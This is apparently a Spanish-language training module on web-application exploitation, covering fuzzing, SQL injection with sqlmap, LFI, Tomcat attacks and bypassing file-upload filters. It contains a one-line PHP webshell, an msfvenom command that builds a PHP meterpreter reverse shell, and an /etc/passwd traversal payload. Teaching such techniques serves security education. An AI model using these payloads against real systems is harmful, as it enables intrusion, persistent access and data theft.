
# 🌐 Explotación de Vulnerabilidades Web

Este módulo abarca las técnicas esenciales para identificar y explotar vulnerabilidades en aplicaciones web. Aprenderás a utilizar herramientas de fuzzing, analizar peticiones HTTP, realizar inyecciones SQL, subir shells web, y más.

---

## 🕵️‍♂️ ¿Qué es el Fuzzing Web? – Uso de Gobuster

**Fuzzing** es el proceso de enviar entradas automatizadas para descubrir directorios, archivos o puntos débiles.

```bash
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt
```

---

## 🌐 Enumeración de Subdominios con Wfuzz

```bash
wfuzz -w subdomains.txt -u http://FUZZ.target.com -H "Host: FUZZ.target.com"
```

---

## 🧬 Transferencia de Zona DNS (OPCIONAL)

```bash
dig @ns1.target.com target.com AXFR
```

Si está mal configurado, puede filtrar información interna del dominio.

---

## 🧪 Otras Herramientas de Fuzzing Web

- `ffuf`: rápido y moderno
- `dirsearch`: en Python
- `dirb`, `dirbuster`: más antiguos pero funcionales

---

## 📤 Explotación de Vulnerabilidad File Upload

Busca formularios de subida de archivos que permitan subir `.php`, `.jsp`, `.asp` o `.aspx`.

### Ejemplo básico:
Sube una webshell PHP:
```php
<?php system($_GET["cmd"]); ?>
```

Y accede:
```
http://target/uploads/shell.php?cmd=id
```

---

## 🔗 Primeros pasos tras la intrusión (TTY)

Convierte tu shell básica en una TTY interactiva:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## ⚙️ Webshell y Acceso Persistente

Puedes subir shells como `c99.php`, `b374k`, o usar:

```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -f raw > shell.php
```

---

## 🛑 Bypass de Restricción File Upload

Técnicas:

- Subir archivos `.php.jpg`
- Usar doble extensión `.php;.jpg`
- Modificar el Content-Type
- Usar herramientas como Burp o ZAP para interceptar y modificar el upload

---

## 🧪 Burp Suite – Modificar Peticiones HTTP

Intercepta y modifica headers como:

- `User-Agent`
- `Referer`
- `Cookie`
- `Content-Type`

---

## 🔁 Burp Suite – Uso del Repeater

Permite repetir solicitudes HTTP modificadas para observar el comportamiento del servidor.

---

## 🎯 Burp Suite – Uso del Intruder

Automatiza ataques como fuerza bruta de login, fuzzing de parámetros, y más.

---

## 💉 Inyecciones SQL – Uso de SQLmap

SQLmap automatiza la detección y explotación de inyecciones SQL.

```bash
sqlmap -u "http://target.com/item.php?id=1" --dbs
```

---

## 💉 SQLmap – Ejemplo 2

Extraer tablas:

```bash
sqlmap -u "http://target.com/item.php?id=1" -D database_name --tables
```

---

## ⚙️ Hacking Servidor Tomcat

Buscar panel de login `/manager/html`. Si se puede acceder con credenciales por defecto, se puede desplegar una shell `.war`.

---

## 📂 Explotación LFI (Local File Inclusion)

```bash
http://target.com/index.php?page=../../../../etc/passwd
```

Buscar inclusión de archivos sensibles del sistema o incluso logs.

---

## 🛡️ Wireshark para Interceptar Credenciales

Captura tráfico vulnerable como FTP, HTTP o Telnet:

```bash
wireshark &
```

Usa filtros como:
```
ftp
http.request
telnet
```

---

📚 Recursos adicionales:

- https://github.com/sqlmapproject/sqlmap
- https://portswigger.net/web-security
- https://ffuf.me/

---

💡 “Conoce cómo hablan las aplicaciones web, y sabrás dónde esconderte… o atacar.”
